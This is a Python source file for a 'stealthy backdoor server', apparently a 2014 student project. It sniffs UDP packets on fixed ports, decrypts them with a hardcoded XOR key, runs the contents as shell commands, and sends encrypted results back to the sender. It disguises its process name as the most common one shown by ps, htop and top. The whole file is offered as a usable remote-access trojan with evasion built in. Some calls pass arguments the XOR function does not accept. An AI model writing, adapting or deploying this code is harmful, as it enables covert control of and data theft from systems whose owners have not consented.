# ###########################################################################################################
# #	SOURCE FILE:		final_backdoor.py - A stealthy backdoor server that can execute remote commands
##
##	PROGRAM:		    backdoor
##
##	FUNCTIONS:		    xor_crypt
##                      remoteExecute
##
##	LAST MODIFIED:		October 6, 2014
##
##	DESIGNERS:	        Zach Smoroden & Slade Solobay
##
##	PROGRAMMERS:        Slade Solobay & Zach Smoroden
##
##	NOTES:
##	This program listens for the client to send remote commands. They will be run, and the results sent
##  	back to the client encrypted.
##
##  OUTPUT: commands/data is printed to standard out to easily see what is happening while testing.
##
##	USAGE: python final_backdoor.py
##
##############################################################################################################

import setproctitle
import sys
from scapy.all import *
import time
import os
from itertools import izip, cycle

################ USER DEFINED ########################################
INTERFACE_ = 'em1'

# Ports must be the same as the client.
SPORT = 8000
DPORT = 7999

# Filter is tcpdump format
FILTER = "udp and src port {0} and dst port {1}".format(SPORT, DPORT)

# Must make sure it is the same as the client
ENCRYPTION_KEY = "zdehjk"
######################################################################


######################################################################
##	FUNCTION:	    xor_crypt
##
##	INTERFACE:	    xor_crypt(data, ENCRYPTION_KEY=ENCRYPTION_KEY, encode=False, decode=False)
##
##				    data:   The payload of the packet sent from the client that contains the
##                          command to execute
##                  ENCRYPTION_KEY:    The encryption ENCRYPTION_KEY.
##                                     Defaults to the user-defined variable ENCRYPTION_KEY
##                  encode: When true, encrypt the data. Default is False.
##                  decode: When true, decode the data. Default is False.
##
##	RETURNS:        The encoded or decoded data.
##
##	LAST MODIFIED:  October 6, 2014
##
##	DESIGNERS:	    Zach Smoroden & Slade Solobay
##
##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
##
##	NOTES:
##	        Use this function for both encryption and decryption. only one of encode/decode needs to be
##          specified in the call.
##
######################################################################
def xor_crypt(data, ENCRYPTION_KEY=ENCRYPTION_KEY):
    message = ''.join(chr(ord(c) ^ ord(k)) for c, k in izip(data, cycle(ENCRYPTION_KEY)))
    return message

######################################################################
##	FUNCTION:	    remoteExecute
##
##	INTERFACE:	    remoteExecute(packet)
##
##				    packet:   The packet that was caught by the sniffer and is from the client.
##
##	RETURNS:        Sends response to client, prints info.
##
##	LAST MODIFIED:  October 6, 2014
##
##	DESIGNERS:	    Zach Smoroden & Slade Solobay
##
##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
##
##	NOTES:
##	        This is a callback for the sniff() call. Any packet captured will come through here.
##
######################################################################
def remoteExecute(packet):
    print "Running Command: " + xor_crypt(packet.load, decode=True)
    command = os.popen(xor_crypt(packet.load, decode=True))
    command_result = command.read()
    print command_result

    dest_ip = packet[0][1].src
    print "Sending encrypted response.."
    send(IP(dst=dest_ip) / UDP(sport=DPORT, dport=SPORT) / xor_crypt(command_result, encode=True))

    return "Packet Arrived" + ": " + packet[0][1].src + "==>" + packet[0][1].dst


######################################################################
##	FUNCTION:	    set_proc_name
##
##	INTERFACE:	   set_proc_name(newname)
##
##				    newname:   The name to change the process name that top sees.
##
##	RETURNS:        Nothing
##
##	LAST MODIFIED:  October 15, 2014
##
##	DESIGNERS:	    Zach Smoroden & Slade Solobay
##
##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
##
##	NOTES:
##	        This will only mask the proccess when looking at top. ps and htop require a different method.
##
######################################################################
def set_proc_name(newname):
    from ctypes import cdll, byref, create_string_buffer

    libc = cdll.LoadLibrary('libc.so.6')
    buff = create_string_buffer(len(newname) + 1)
    buff.value = newname
    libc.prctl(15, byref(buff), 0, 0, 0)

######################################################################
##	FUNCTION:	    set_proc_name
##
##	INTERFACE:	   set_proc_name(newname)
##
##				    newname:   The name to change the process name that top sees.
##
##	RETURNS:        Nothing
##
##	LAST MODIFIED:  October 15, 2014
##
##	DESIGNERS:	    Zach Smoroden & Slade Solobay
##
##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
##
##	NOTES:
##	        This will only mask the proccess when looking at top. ps and htop require a different method.
##
######################################################################
def mask_process():
    # Gets the most common process name for ps -aux/htop
    command = os.popen("ps -aux | awk '{ print $11 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
    command_result = command.read()
    print "The most common process for ps/htop is: {0} \n".format(command_result)

    # Masks the process for ps -aux and htop.
    setproctitle.setproctitle(command_result)

    # Gets the most common process name from top
    command = os.popen("top -bn1 | awk '{ print $12 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
    command_result = command.read()

    # Masks the process for top
    set_proc_name(command_result)
    print "The most common process for top is: {0} \n".format(command_result)

###### START OF SCRIPT #######
# To show the user what it is listening for.
print FILTER

# Mask the processes.
mask_process()

# Start sniffing for packets
sniff(filter=FILTER, prn=remoteExecute)